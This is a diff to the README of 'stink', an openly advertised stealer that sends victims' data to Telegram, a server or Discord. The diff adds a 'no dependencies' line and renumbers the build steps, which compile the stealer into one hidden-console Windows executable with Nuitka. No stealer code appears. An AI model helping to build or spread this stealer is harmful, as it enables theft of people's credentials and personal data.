@@ -1,6 +1,6 @@
 # stink
 
-Stealer in just a few lines with sending to Telegram / Server / Discord.
+Stealer in just a few lines with sending to Telegram / Server / Discord. No dependencies, only built-in libraries.
 
 **Wiki:** https://github.com/FallenAstaroth/stink/wiki
 
@@ -149,19 +149,15 @@ virtualenv venv
 ```
 venv\Scripts\activate
 ```
-5. Install the requirements:
-```
-pip install -r requirements.txt
-```
-6. Install the Nuitka:
+5. Install the Nuitka:
 ```
 pip install Nuitka==0.6.16.4
 ```
-7. To reduce the file size, additionally install Zstandard (optional):
+6. To reduce the file size, additionally install Zstandard (optional):
 ```
 pip install zstandard==0.17.0
 ```
-8. Write the command:
+7. Write the command:
 ```
 nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
 ```
